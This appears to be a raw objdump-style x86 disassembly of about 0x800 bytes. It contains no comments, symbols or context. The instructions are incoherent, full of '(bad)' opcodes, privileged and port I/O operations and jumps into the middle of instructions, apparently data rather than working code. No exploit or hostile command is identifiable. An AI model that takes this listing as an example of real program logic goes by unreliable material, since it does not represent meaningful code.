  41b954:	xchg   edi,eax
  41b955:	ret    0x6969
  41b958:	adc    ebp,edx
  41b95a:	pop    es
  41b95b:	xor    edi,DWORD PTR [bx+di-0x5acf]
  41b960:	js     0x41b8ee
  41b962:	push   esi
  41b963:	mov    eax,ds:0x439971c6
  41b968:	ds js  0x41b9c6
  41b96b:	push   es
  41b96c:	out    0x99,al
  41b96e:	inc    ebp
  41b96f:	mov    al,BYTE PTR [esi+edi*8]
  41b972:	push   ecx
  41b973:	pop    es
  41b974:	enter  0xfc87,0xb1
  41b978:	or     BYTE PTR [eax-0x336001f0],dl
  41b97e:	add    eax,0xaf884044
  41b983:	jo     0x41b921
  41b985:	sbb    dl,BYTE PTR ss:[edx+esi*1]
  41b989:	mov    eax,0xa798a24d
  41b98e:	mov    eax,0xebd22998
  41b993:	and    BYTE PTR [esi-0x2ad8460f],0xcf
  41b99a:	mov    dl,0x42
  41b99c:	add    BYTE PTR [ecx-0x50afe005],0xa0
  41b9a3:	popf   
  41b9a4:	pop    es
  41b9a5:	jl     0x41b97c
  41b9a7:	ss (bad) 
  41b9a9:	jno    0x41b932
  41b9ab:	scas   al,BYTE PTR es:[edi]
  41b9ac:	rol    BYTE PTR [edi+0x45102521],0xd0
  41b9b3:	xchg   edi,eax
  41b9b4:	loopne 0x41ba02
  41b9b6:	mov    ch,0x15
  41b9b8:	ror    DWORD PTR [ecx],cl
  41b9ba:	push   edx
  41b9bb:	jecxz  0x41b967
  41b9bd:	mov    eax,0xc4c8e44e
  41b9c2:	mov    ah,0x9a
  41b9c4:	fst    DWORD PTR [ecx-0x21]
  41b9c7:	shr    DWORD PTR [eax-0x71ef35c1],0x22
  41b9ce:	push   esp
  41b9cf:	adc    BYTE PTR [ecx-0x2b],bl
  41b9d2:	add    eax,0x147afa70
  41b9d7:	sub    ebx,ecx
  41b9d9:	adc    bh,bl
  41b9db:	push   ebx
  41b9dc:	sub    eax,0xff5a6159
  41b9e1:	jb     0x41ba1c
  41b9e3:	and    bh,bh
  41b9e5:	jo     0x41b97a
  41b9e7:	mov    BYTE PTR [ecx-0x6],cl
  41b9ea:	cs aad 0x4b
  41b9ed:	mov    dh,0xf9
  41b9ef:	lods   al,BYTE PTR ds:[esi]
  41b9f0:	and    DWORD PTR [ebp+0x26a0ed35],esp
  41b9f6:	jg     0x41b9ff
  41b9f8:	cld    
  41b9f9:	jp     0x41b9e7
  41b9fb:	sub    eax,0x6bf87865
  41ba00:	add    dl,bh
  41ba02:	test   eax,0x52acf48a
  41ba07:	retf   0xc219
  41ba0a:	xchg   ebx,eax
  41ba0b:	and    DWORD PTR [edx],ecx
  41ba0d:	arpl   sp,bx
  41ba0f:	add    BYTE PTR [edx],bl
  41ba11:	ds dec esp
  41ba13:	push   ds
  41ba14:	into   
  41ba15:	imul   edi,DWORD PTR [ecx-0x59e7934b],0x64
  41ba1c:	gs out 0x9b,eax
  41ba1f:	add    eax,0xaf242b04
  41ba24:	inc    ebx
  41ba25:	cmp    bh,BYTE PTR [ebx+0x10]
  41ba28:	jnp    0x41ba50
  41ba2a:	sub    BYTE PTR [esi-0x53da0766],ch
  41ba30:	mov    al,ds:0x7b69c226
  41ba35:	stos   DWORD PTR es:[edi],eax
  41ba36:	sub    BYTE PTR [eax-0x7b],cl
  41ba39:	xor    al,0x74
  41ba3b:	sbb    dl,BYTE PTR [edi+edx*1]
  41ba3e:	adc    eax,DWORD PTR [edi]
  41ba40:	xor    eax,0xa1374596
  41ba45:	pop    es
  41ba46:	sbb    ah,BYTE PTR [esp+edi*4-0x43ef5085]
  41ba4d:	out    0x64,al
  41ba4f:	sar    DWORD PTR [edi-0x39c0b4],1
  41ba55:	push   esp
  41ba56:	das    
  41ba57:	and    eax,0x4784a742
  41ba5c:	lds    ebp,FWORD PTR [edi+edi*8]
  41ba5f:	popf   
  41ba60:	test   eax,0x33734129
  41ba65:	scas   eax,DWORD PTR es:[edi]
  41ba66:	sbb    al,0xed
  41ba68:	xchg   edx,eax
  41ba69:	inc    esi
  41ba6a:	sbb    ecx,DWORD PTR [ecx+0xd4d9683]
  41ba70:	test   eax,0xec9c2ed2
  41ba75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba76:	jbe    0x41b9f9
  41ba78:	or     eax,0x113ee20e
  41ba7d:	into   
  41ba7e:	lahf   
  41ba7f:	or     edi,DWORD PTR [esi-0x28]
  41ba82:	fisttp WORD PTR fs:[edx]
  41ba85:	test   esp,esi
  41ba87:	adc    DWORD PTR [edi+0x44217469],esp
  41ba8d:	jae    0x41babb
  41ba8f:	push   0xc
  41ba91:	jo     0x41ba57
  41ba93:	pusha  
  41ba94:	test   al,0x3a
  41ba96:	hlt    
  41ba97:	push   0x30
  41ba99:	push   esi
  41ba9a:	pop    ebp
  41ba9b:	inc    ecx
  41ba9c:	mov    ecx,0x27d9cca3
  41baa1:	data16 fcmovnb st,st(5)
  41baa4:	add    DWORD PTR [eax+edx*2-0x6ec90882],ecx
  41baab:	(bad)  
  41baad:	ins    DWORD PTR es:[edi],dx
  41baae:	fisttp DWORD PTR [esp+ebp*2+0x7a]
  41bab2:	jge    0x41bae0
  41bab4:	add    esi,DWORD PTR [ebx-0x17]
  41bab7:	mov    ebp,DWORD PTR [edi+0x3e]
  41baba:	jle    0x41babb
  41babc:	arpl   WORD PTR [ebx+esi*4],di
  41babf:	retf   0x7b80
  41bac2:	nop
  41bac3:	fidivr DWORD PTR [esi+0x17]
  41bac6:	jp     0x41bb0f
  41bac8:	and    dh,0xf5
  41bacb:	adc    BYTE PTR [edx-0x41c44c0],ch
  41bad1:	fstp   TBYTE PTR [ebp+0x1c640f08]
  41bad7:	loopne 0x41baed
  41bad9:	cmp    eax,0x9fa03abb
  41bade:	mov    dl,0xd0
  41bae0:	push   esp
  41bae1:	push   0x233c766e
  41bae6:	fstp   DWORD PTR [edi-0x478fd2eb]
  41baec:	push   edi
  41baed:	and    DWORD PTR [ebx+ebx*1],esp
  41baf0:	(bad)  [ecx]
  41baf2:	and    DWORD PTR [esi-0x45],esp
  41baf5:	retf   0xa6cc
  41baf8:	mov    edi,0xc9588693
  41bafd:	fiadd  WORD PTR [ecx+ecx*4+0x21e16f63]
  41bb04:	inc    esp
  41bb05:	cmp    eax,0x6e0a7f62
  41bb0a:	xchg   edi,eax
  41bb0b:	mov    ecx,0xef059848
  41bb10:	xor    esp,DWORD PTR [eax+ebp*8]
  41bb13:	fs iret 
  41bb15:	dec    esp
  41bb16:	out    dx,al
  41bb17:	adc    eax,0xaab82fbf
  41bb1c:	push   eax
  41bb1d:	pop    ss
  41bb1e:	adc    DWORD PTR [edx],0x3c
  41bb21:	xchg   ebp,eax
  41bb22:	fbld   TBYTE PTR [esi+0x4ef1b82d]
  41bb28:	dec    edx
  41bb29:	lahf   
  41bb2a:	test   eax,edx
  41bb2c:	dec    eax
  41bb2d:	sub    ch,BYTE PTR ds:0xf2c581f5
  41bb33:	imul   edi,DWORD PTR [ebx-0x6c679d24],0x44
  41bb3a:	push   edi
  41bb3b:	adc    BYTE PTR [edx+0x4],0xa
  41bb3f:	sar    DWORD PTR [ecx-0x438c0778],1
  41bb45:	test   al,0x5c
  41bb47:	or     eax,0xccd4c723
  41bb4c:	loopne 0x41bb03
  41bb4e:	mov    eax,ds:0xb70a46da
  41bb53:	and    al,BYTE PTR [edx+ecx*4-0x1fe5f8b5]
  41bb5a:	(bad)  
  41bb5b:	push   edx
  41bb5c:	sti    
  41bb5d:	mov    ds:0x80c8556a,al
  41bb62:	mov    cl,0x39
  41bb64:	sbb    al,0xdc
  41bb66:	ret    0x3c26
  41bb69:	push   edi
  41bb6a:	jle    0x41bb3e
  41bb6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb6d:	cli    
  41bb6e:	push   edi
  41bb6f:	add    BYTE PTR [esi],0x49
  41bb72:	add    cl,cl
  41bb74:	push   0xffffffcb
  41bb76:	jne    0x41bba7
  41bb78:	sub    BYTE PTR [edi-0x14],dh
  41bb7b:	ret    
  41bb7c:	dec    esi
  41bb7d:	lahf   
  41bb7e:	xor    eax,0x34dee622
  41bb83:	and    BYTE PTR [edx],dh
  41bb85:	and    eax,0xd833c1bf
  41bb8a:	icebp  
  41bb8b:	xchg   edx,eax
  41bb8c:	xor    eax,0xb665721f
  41bb91:	(bad)  
  41bb92:	mov    ebp,0xa4b8d2fe
  41bb97:	fist   WORD PTR [ebp+0x3b]
  41bb9a:	aam    0xfa
  41bb9c:	pushw  0x1879
  41bba0:	loope  0x41bbb1
  41bba2:	mov    eax,ds:0xc01142b3
  41bba7:	rcr    edi,0xdb
  41bbaa:	mov    bh,ah
  41bbac:	or     ebx,DWORD PTR [edx]
  41bbae:	ins    BYTE PTR es:[edi],dx
  41bbaf:	je     0x41bbcc
  41bbb1:	push   esi
  41bbb2:	loope  0x41bb62
  41bbb4:	popa   
  41bbb5:	and    al,0xe6
  41bbb7:	icebp  
  41bbb8:	sti    
  41bbb9:	ficomp DWORD PTR [ebp-0x62]
  41bbbc:	sub    al,0xa0
  41bbbe:	pop    edx
  41bbbf:	adc    esi,eax
  41bbc1:	in     al,dx
  41bbc2:	fcmovnu st,st(0)
  41bbc4:	sub    al,0x62
  41bbc6:	pop    ss
  41bbc7:	sar    BYTE PTR [edi-0x494ae0b2],cl
  41bbcd:	imul   edx,DWORD PTR [edi+0x7480223a],0x78
  41bbd4:	inc    edi
  41bbd5:	and    eax,0xdb1c3cd7
  41bbda:	push   ss
  41bbdb:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41bbdd:	sbb    al,0xe3
  41bbdf:	aad    0x91
  41bbe1:	iret   
  41bbe2:	retf   
  41bbe3:	jb     0x41bb9c
  41bbe5:	pop    esp
  41bbe6:	sbb    al,BYTE PTR [edx]
  41bbe8:	repz xor al,0xba
  41bbeb:	push   0x8
  41bbed:	fcom   QWORD PTR [esp+eiz*8+0x24]
  41bbf1:	(bad)  
  41bbf2:	loop   0x41bc03
  41bbf4:	or     bl,BYTE PTR [ebp+0x2f90a2f0]
  41bbfa:	aas    
  41bbfb:	or     eax,DWORD PTR [ebp-0x6f]
  41bbfe:	mov    ah,0x2b
  41bc00:	mov    bl,0xe0
  41bc02:	dec    ebx
  41bc03:	cmp    al,0x3d
  41bc05:	shl    DWORD PTR [eax+0xb],1
  41bc08:	push   ebx
  41bc09:	lods   eax,DWORD PTR ds:[esi]
  41bc0a:	das    
  41bc0b:	inc    ebp
  41bc0c:	in     eax,0x7c
  41bc0e:	cli    
  41bc0f:	aad    0xeb
  41bc11:	clc    
  41bc12:	mov    BYTE PTR [ebx+0x31],0x3a
  41bc16:	xchg   ecx,eax
  41bc17:	inc    edi
  41bc18:	sahf   
  41bc19:	dec    esi
  41bc1a:	std    
  41bc1b:	or     eax,0x7958aded
  41bc20:	sahf   
  41bc21:	loope  0x41bbee
  41bc23:	imul   edi,DWORD PTR [esi+0xfc2bb09],0x66c54675
  41bc2d:	sub    BYTE PTR [edi],ch
  41bc2f:	sahf   
  41bc30:	fstp   TBYTE PTR ds:0xe8e255d6
  41bc36:	xor    BYTE PTR [ebx],dh
  41bc38:	pop    ds
  41bc39:	test   eax,0xa0f9bb1e
  41bc3e:	outs   dx,BYTE PTR ds:[esi]
  41bc3f:	mov    ebx,0xc35ebf96
  41bc44:	mov    bl,0xad
  41bc46:	ror    esi,cl
  41bc48:	push   ebx
  41bc49:	sub    al,0x37
  41bc4b:	in     al,dx
  41bc4c:	mov    al,BYTE PTR [ebx]
  41bc4e:	or     edx,DWORD PTR [edi+0x32]
  41bc51:	inc    eax
  41bc52:	mov    ?,WORD PTR ds:0x1b393d8
  41bc58:	in     al,dx
  41bc59:	pop    edi
  41bc5a:	mov    eax,0xb3b17669
  41bc5f:	mov    dh,0x1
  41bc61:	add    ebp,DWORD PTR [eax+0x5b]
  41bc64:	rcl    ah,1
  41bc66:	stc    
  41bc67:	add    ah,BYTE PTR [edx-0x3519a12c]
  41bc6d:	fwait
  41bc6e:	xor    BYTE PTR [edx],cl
  41bc70:	mov    dl,0x9a
  41bc72:	mov    ecx,0xa74eb4cc
  41bc77:	test   eax,0xee745c2e
  41bc7c:	xchg   esi,eax
  41bc7d:	xor    al,0x17
  41bc7f:	dec    edi
  41bc80:	and    DWORD PTR [ebx+0xf],edi
  41bc83:	inc    ecx
  41bc84:	bound  edx,QWORD PTR [ebx-0x28b25790]
  41bc8a:	shl    DWORD PTR [ebx+0x4d],cl
  41bc8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc8e:	or     al,0xb9
  41bc90:	mov    esi,0x675acf38
  41bc95:	popf   
  41bc96:	lahf   
	...
  41bd13:	add    ch,ch
  41bd15:	jle    0x41bd09
  41bd17:	ret    
  41bd18:	repz iret 
  41bd1a:	std    
  41bd1b:	jle    0x41bcfc
  41bd1d:	loope  0x41bd61
  41bd1f:	mov    al,0x88
  41bd21:	mov    WORD PTR [esp+ebp*4-0xc],es
  41bd25:	pop    edx
  41bd26:	add    DWORD PTR [eax],eax
  41bd28:	imul   eax,DWORD PTR [edi],0x0
  41bd2b:	add    BYTE PTR [esi-0xb],al
  41bd2e:	rcr    BYTE PTR [ecx],cl
  41bd30:	push   edx
  41bd31:	lock loope 0x41bcf6
  41bd34:	push   es
  41bd35:	and    eax,0xb51f8ef9
  41bd3a:	add    BYTE PTR [ecx],bh
  41bd3c:	ss fdivrp st(4),st
  41bd3f:	(bad)  
  41bd40:	jb     0x41bcdd
  41bd42:	fld    DWORD PTR [ecx+0x50]
  41bd45:	cmc    
  41bd46:	js     0x41bd95
  41bd48:	add    ebx,DWORD PTR [edx+0x78fbfd3c]
  41bd4e:	mov    ah,0x3b
  41bd50:	adc    bl,BYTE PTR [ebp-0xb39492]
  41bd56:	ja     0x41bd5e
  41bd58:	xchg   esp,eax
  41bd59:	or     cl,cl
  41bd5b:	(bad)  
  41bd5c:	test   eax,0x47f9e592
  41bd61:	bound  edi,QWORD PTR [esi]
  41bd63:	jae    0x41bd5b
  41bd65:	jo     0x41bd5d
  41bd67:	enter  0xd12d,0x3f
  41bd6b:	cmp    edx,DWORD PTR [edx+0x6b719a76]
  41bd71:	out    0x74,al
  41bd73:	xchg   edi,eax
  41bd74:	xor    al,0xab
  41bd76:	(bad)  
  41bd77:	push   ds
  41bd78:	adc    al,0xa9
  41bd7a:	xor    eax,0x396b0bbf
  41bd7f:	inc    ebx
  41bd80:	mov    dh,0xc7
  41bd82:	cli    
  41bd83:	push   DWORD PTR [ecx-0x35]
  41bd86:	js     0x41bd34
  41bd88:	fild   DWORD PTR [esi+eiz*1-0x7b]
  41bd8c:	fs inc edi
  41bd8e:	xor    DWORD PTR [edx+0x56a57da2],0xffffffb1
  41bd95:	sahf   
  41bd96:	or     eax,0x8fc7ccb0
  41bd9b:	sub    BYTE PTR [edi-0x5e6fb598],bh
  41bda1:	out    dx,al
  41bda2:	and    al,0x5c
  41bda4:	add    al,ch
  41bda6:	cmp    ebp,eax
  41bda8:	arpl   WORD PTR ds:[ebx-0x45da1355],dx
  41bdaf:	int    0x2d
  41bdb1:	adc    cl,cl
  41bdb3:	pop    esp
  41bdb4:	add    BYTE PTR [esp+ecx*8-0x5b4ef769],bl
  41bdbb:	pop    ds
  41bdbc:	inc    ecx
  41bdbd:	(bad)  
  41bdbe:	(bad)  
  41bdbf:	jae    0x41be2f
  41bdc1:	cmp    DWORD PTR [eax+0x4f41ca3d],edi
  41bdc7:	ins    BYTE PTR es:[edi],dx
  41bdc8:	inc    edi
  41bdc9:	mov    bh,0x74
  41bdcb:	pop    ebp
  41bdcc:	test   al,0x45
  41bdce:	into   
  41bdcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdd1:	je     0x41bd7b
  41bdd3:	mov    ebx,0x8e67e5ac
  41bdd8:	sahf   
  41bdd9:	pusha  
  41bdda:	jo     0x41bdd0
  41bddc:	jmp    0x36db:0x5a813fa1
  41bde3:	ja     0x41bdde
  41bde5:	les    ecx,FWORD PTR [edx+0x7d77d253]
  41bdeb:	aam    0xc1
  41bded:	add    cl,al
  41bdef:	pop    DWORD PTR [eax-0x3d2de9ef]
  41bdf5:	out    dx,al
  41bdf6:	mov    al,ds:0x5550294a
  41bdfb:	jb     0x41be09
  41bdfd:	jne    0x41be42
  41bdff:	jp     0x41be13
  41be01:	sti    
  41be02:	add    DWORD PTR [eax+0xb],esp
  41be05:	retf   0xcdf5
  41be08:	mov    eax,0x6cd2114b
  41be0d:	or     al,0xf1
  41be0f:	mov    dh,0x40
  41be11:	bound  ebx,QWORD PTR [edx+ebx*2-0x23b03a14]
  41be18:	repz test al,0x9a
  41be1b:	fwait
  41be1c:	jb     0x41bdc8
  41be1e:	and    al,0x9c
  41be20:	mov    BYTE PTR [edx],0x27
  41be23:	xchg   esi,esp
  41be25:	sub    eax,0x14c3d869
  41be2a:	lock mov bl,0x86
  41be2d:	inc    ebp
  41be2e:	loopne 0x41bea2
  41be30:	adc    cl,BYTE PTR [ebx]
  41be32:	jno    0x41be9c
  41be34:	jl     0x41be74
  41be36:	push   edx
  41be37:	dec    edi
  41be38:	mov    ah,0xc
  41be3a:	cmc    
  41be3b:	add    al,0x5f
  41be3d:	adc    al,0x64
  41be3f:	aas    
  41be40:	pop    eax
  41be41:	shl    DWORD PTR [edi-0x53],1
  41be44:	jne    0x41bdee
  41be46:	test   eax,0x2171591f
  41be4b:	pop    es
  41be4c:	adc    al,0x58
  41be4e:	dec    esp
  41be4f:	sti    
  41be50:	add    al,0x9e
  41be52:	shl    BYTE PTR [ebx-0x40],1
  41be55:	sbb    eax,0x5eb22bc3
  41be5a:	fidiv  DWORD PTR [eax+0x7d7b7921]
  41be60:	shl    DWORD PTR [ebp-0x80],1
  41be63:	pop    esi
  41be64:	cmp    DWORD PTR [ebp+0x68818290],ebx
  41be6a:	repz xchg ecx,eax
  41be6c:	sub    eax,DWORD PTR fs:[eax+0x1a855f9a]
  41be73:	add    bl,bh
  41be75:	out    0xaa,al
  41be77:	stos   BYTE PTR es:[edi],al
  41be78:	xchg   esi,eax
  41be79:	pop    ebx
  41be7a:	popf   
  41be7b:	imul   ebx,DWORD PTR [eax-0x24],0x6cc2fbaa
  41be82:	(bad)  
  41be83:	das    
  41be84:	call   FWORD PTR [ebx]
  41be86:	pop    ds
  41be87:	scas   eax,DWORD PTR es:[edi]
  41be88:	imul   esp,DWORD PTR [ecx+0x2fcab61f],0xa282e902
  41be92:	mov    ds:0x25d7672d,al
  41be97:	lock push cs
  41be99:	xor    BYTE PTR [esi+0x7],dl
  41be9c:	clc    
  41be9d:	mov    ?,WORD PTR [edi+0x1672a3eb]
  41bea3:	data16 outs dx,BYTE PTR ds:[esi]
  41bea5:	js     0x41be43
  41bea7:	cmp    BYTE PTR [edx-0x7f8911bb],bh
  41bead:	mov    ah,0x12
  41beaf:	scas   eax,DWORD PTR es:[edi]
  41beb0:	aaa    
  41beb1:	push   0x9b53ee35
  41beb6:	mov    esp,0xa1ec71b0
  41bebb:	aaa    
  41bebc:	lea    edi,[ebx-0x61]
  41bebf:	mov    dl,0x4b
  41bec1:	or     al,0xaa
  41bec3:	fist   WORD PTR [esi-0x76]
  41bec6:	mov    ecx,0x9665d5f0
  41becb:	(bad)  [ebx+0x6ab1c396]
  41bed1:	sti    
  41bed2:	lods   al,BYTE PTR ds:[si]
  41bed4:	fcomp  DWORD PTR [esi-0x29611cb4]
  41beda:	add    eax,0x6e92f886
  41bedf:	and    al,0x99
  41bee1:	inc    DWORD PTR [edx]
  41bee3:	jnp    0x41bebc
  41bee5:	cmp    esp,DWORD PTR [edx]
  41bee7:	mov    ah,0x25
  41bee9:	inc    esp
  41beea:	jmp    0x41becb
  41beec:	mov    ds:0x24070490,al
  41bef1:	or     eax,0x2a29936b
  41bef6:	pop    ebx
  41bef7:	add    ebp,edx
  41bef9:	sti    
  41befa:	inc    esi
  41befb:	mov    edi,0x3a906d43
  41bf00:	lea    ebp,[esi]
  41bf02:	(bad)  
  41bf03:	cwde   
  41bf04:	sub    esi,edx
  41bf06:	xor    eax,0x6a31c84a
  41bf0b:	adc    eax,edx
  41bf0d:	outs   dx,DWORD PTR ds:[esi]
  41bf0e:	xor    cl,BYTE PTR [edi]
  41bf10:	clc    
  41bf11:	mov    eax,0xc4d26a40
  41bf16:	stos   BYTE PTR es:[edi],al
  41bf17:	popa   
  41bf18:	mov    es,WORD PTR [ecx]
  41bf1a:	xchg   esi,eax
  41bf1b:	aas    
  41bf1c:	aam    0xcc
  41bf1e:	cli    
  41bf1f:	sbb    BYTE PTR [eax+0x2c70b231],al
  41bf25:	sub    BYTE PTR [ebx],bl
  41bf27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf28:	jle    0x41bf98
  41bf2a:	add    DWORD PTR [edx],edi
  41bf2c:	int    0x14
  41bf2e:	inc    ebx
  41bf2f:	adc    BYTE PTR [ebp-0x48643df9],dl
  41bf35:	push   ebp
  41bf36:	xchg   edi,ebp
  41bf38:	aas    
  41bf39:	lods   eax,DWORD PTR ds:[esi]
  41bf3a:	cmp    eax,esp
  41bf3c:	popa   
  41bf3d:	pop    edx
  41bf3e:	or     al,0x81
  41bf40:	hlt    
  41bf41:	jp     0x41bec4
  41bf43:	ror    BYTE PTR [ebx+0x45],1
  41bf46:	and    DWORD PTR [ebx-0x79],edx
  41bf49:	scas   eax,DWORD PTR es:[edi]
  41bf4a:	xor    ecx,eax
  41bf4c:	arpl   sp,ax
  41bf4e:	xchg   ebp,eax
  41bf4f:	mov    edi,0x822095fd
  41bf54:	dec    eax
  41bf55:	cmp    DWORD PTR [eax+0x31871b48],eax
  41bf5b:	mov    al,0x42
  41bf5d:	stos   BYTE PTR es:[edi],al
  41bf5e:	stos   BYTE PTR es:[edi],al
  41bf5f:	enter  0x30c3,0xfd
  41bf63:	mov    edx,0x5c86276b
  41bf68:	add    al,0x72
  41bf6a:	addr16 mov esi,0x5b110e9
  41bf70:	pop    ebx
  41bf71:	and    eax,0x956ba931
  41bf76:	sub    edi,DWORD PTR ds:0xc3b83a24
  41bf7c:	stos   DWORD PTR es:[edi],eax
  41bf7d:	or     BYTE PTR [esi+ecx*4-0x7d],dh
  41bf81:	mov    al,0x4a
  41bf83:	test   edx,esi
  41bf85:	mov    ah,0x21
  41bf87:	stos   BYTE PTR es:[edi],al
  41bf88:	and    BYTE PTR [ecx+0x45d12f0],dh
  41bf8e:	neg    BYTE PTR [edi+0x2b]
  41bf91:	jg     0x41bfb1
  41bf93:	jl     0x41bf38
  41bf95:	pop    edi
  41bf96:	inc    ebp
  41bf97:	(bad)  
  41bf98:	xchg   esi,eax
  41bf99:	xchg   ebp,eax
  41bf9a:	stc    
  41bf9b:	stos   BYTE PTR es:[edi],al
  41bf9c:	shr    BYTE PTR [ebp-0x13],cl
  41bf9f:	ja     0x41bf4c
  41bfa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfa2:	mov    bl,0x9a
  41bfa4:	and    DWORD PTR fs:[ebx-0x72bc745c],esi
  41bfab:	mov    ds:0x8332db25,al
  41bfb0:	int    0xdf
  41bfb2:	ja     0x41bfec
  41bfb4:	adc    BYTE PTR [edi],al
  41bfb6:	mov    esi,0x923dbadb
  41bfbb:	mov    al,0x71
  41bfbd:	ins    DWORD PTR es:[edi],dx
  41bfbe:	(bad)  
  41bfbf:	stc    
  41bfc0:	mov    esi,0xbcb5b033
  41bfc5:	cmp    DWORD PTR [ecx],esp
  41bfc7:	loope  0x41bf61
  41bfc9:	and    al,0x14
  41bfcb:	mov    dl,0xa5
  41bfcd:	sub    BYTE PTR [ecx-0x7e],al
  41bfd0:	or     BYTE PTR [ebx],dh
  41bfd2:	add    eax,0xb5797a06
  41bfd7:	add    DWORD PTR [ebx],ecx
  41bfd9:	adc    DWORD PTR [edi+0x77],0x2cbbaaf1
  41bfe0:	lock mov dh,0xb8
  41bfe3:	pop    es
  41bfe4:	cmp    BYTE PTR [ebx],dl
  41bfe6:	mov    dh,0x66
  41bfe8:	sbb    bh,BYTE PTR [ebp+0xd]
  41bfeb:	mov    ss,WORD PTR [ecx+0x4a]
  41bfee:	std    
  41bfef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bff0:	fstp   TBYTE PTR [ecx+0x75433fc9]
  41bff6:	lods   al,BYTE PTR ds:[esi]
  41bff7:	xor    BYTE PTR ds:0x7631a07b,bh
  41bffd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bffe:	outs   dx,DWORD PTR ds:[esi]
  41bfff:	xor    eax,0xdd8b7d94
  41c004:	sti    
  41c005:	aam    0x8d
  41c007:	cbw    
  41c009:	or     cl,bh
  41c00b:	mov    edx,0x9176386f
  41c010:	lds    ebx,FWORD PTR [eax+0xd]
  41c013:	adc    edx,DWORD PTR [eax]
  41c015:	sub    DWORD PTR [ebp+0x7b632e4f],esi
  41c01b:	jno    0x41c038
  41c01d:	mov    bl,0xc4
  41c01f:	dec    eax
  41c020:	and    DWORD PTR [eax-0x2f],eax
  41c023:	dec    edi
  41c024:	lods   al,BYTE PTR ds:[esi]
  41c025:	aas    
  41c026:	(bad)  
  41c027:	sti    
  41c028:	loopne 0x41bfc6
  41c02a:	mov    al,0x67
  41c02c:	ja     0x41c077
  41c02e:	jb     0x41c044
  41c030:	(bad)  
  41c031:	inc    dh
  41c033:	(bad)  
  41c034:	or     al,0xe6
  41c036:	jp     0x41bffe
  41c038:	ds mov al,0x15
  41c03b:	mov    al,ds:0xc087a0d2
  41c040:	cmc    
  41c041:	pusha  
  41c042:	sqrtps xmm2,XMMWORD PTR [esi+0x54]
  41c046:	sub    bh,bl
  41c048:	push   edi
  41c049:	leave  
  41c04a:	push   ds
  41c04b:	mov    ebp,0x3b732946
  41c050:	iret   
  41c051:	inc    eax
  41c052:	out    0x94,eax
  41c054:	sub    BYTE PTR cs:0x41868687,bl
  41c05b:	arpl   sp,di
  41c05d:	test   ebp,0x86bf6182
  41c063:	fwait
  41c064:	jae    0x41c00e
  41c066:	dec    ebp
  41c067:	mov    al,ds:0x68704598
  41c06c:	(bad)  
  41c06d:	pop    edi
  41c06e:	mov    BYTE PTR [ebx+0x42],cl
  41c071:	lods   al,BYTE PTR ds:[esi]
  41c072:	pop    ebp
  41c073:	rcl    DWORD PTR [esi+0x7b],0x39
  41c077:	stos   BYTE PTR es:[edi],al
  41c078:	xchg   ecx,eax
  41c079:	stos   BYTE PTR es:[edi],al
  41c07a:	and    bl,BYTE PTR [ebx-0x4d9792ae]
  41c080:	pop    ecx
  41c081:	fist   DWORD PTR [eax+0x7c9cdd46]
  41c087:	fwait
  41c088:	sbb    eax,0x5f79da0f
  41c08d:	inc    edx
  41c08e:	mov    ch,0xa
  41c090:	(bad)  
  41c091:	mov    ch,0x1b
  41c093:	mov    eax,ds:0x9d9e61e5
  41c098:	repz xchg esi,eax
  41c09a:	pop    esp
  41c09b:	push   0x8151e78f
  41c0a0:	stos   BYTE PTR es:[edi],al
  41c0a1:	jmp    0x41c10b
  41c0a3:	inc    edi
  41c0a4:	add    bh,BYTE PTR [ebp+0xc13fc44]
  41c0aa:	mov    esi,0x18c34cc0
  41c0af:	jle    0x41c085
  41c0b1:	fdiv   QWORD PTR [ecx]
  41c0b3:	(bad)
  41c0b8:	xor    DWORD PTR [ebp-0x21],0x54
  41c0bc:	in     al,0x52
  41c0be:	(bad)  
  41c0bf:	inc    DWORD PTR [ecx-0x2e]
  41c0c2:	sar    ah,cl
  41c0c4:	mov    dh,BYTE PTR [edx-0x3e0d49a9]
  41c0ca:	add    DWORD PTR [ecx+0x703e377e],0xffffffee
  41c0d1:	xchg   esp,eax
  41c0d2:	mov    ah,0xe7
  41c0d4:	es (bad) 
  41c0d6:	(bad)
  41c0d9:	(bad)  
  41c0db:	push   edx
  41c0dc:	xchg   esp,eax
  41c0dd:	lea    esi,[esi]
  41c0df:	pop    ss
  41c0e0:	les    esp,FWORD PTR [ebp-0x7f]
  41c0e3:	cmc    
  41c0e4:	xor    ecx,DWORD PTR [ecx+0x287adcbf]
  41c0ea:	out    dx,eax
  41c0eb:	dec    esp
  41c0ec:	or     al,0xe7
  41c0ee:	clc    
  41c0ef:	mul    DWORD PTR [esi]
  41c0f1:	sbb    cl,BYTE PTR [ebx-0x549527e3]
  41c0f7:	retf   
  41c0f8:	sub    DWORD PTR [esi],edx
  41c0fa:	loope  0x41c0d6
  41c0fc:	mov    ebp,0x50ffdaad
  41c101:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c102:	jle    0x41c08e
  41c104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c105:	mov    esp,0xdcf03b21
  41c10a:	adc    BYTE PTR [edi],al
  41c10c:	sti    
  41c10d:	mov    eax,0x39943098
  41c112:	imul   ebx,DWORD PTR [edi+ecx*8],0x25292b10
  41c119:	sub    DWORD PTR ds:0x9307252a,eax
  41c11f:	outs   dx,DWORD PTR ds:[esi]
  41c120:	in     eax,0x33
  41c122:	push   0x24
  41c124:	lock jns 0x41c0b4
  41c127:	inc    esi
  41c128:	sub    al,0xda
  41c12a:	xchg   ebp,eax
  41c12b:	imul   ebp,DWORD PTR [edi-0x12],0xe128274b
  41c132:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c133:	stc    
  41c134:	xor    bl,BYTE PTR [eax+0x1db4fda]
  41c13a:	(bad)  
  41c13b:	fld    st(2)
  41c13d:	pop    ds
  41c13e:	ins    DWORD PTR es:[edi],dx
  41c13f:	cdq    
  41c140:	icebp  
  41c141:	(bad)  
  41c142:	and    bl,BYTE PTR gs:[ecx-0x14]
  41c146:	leave  
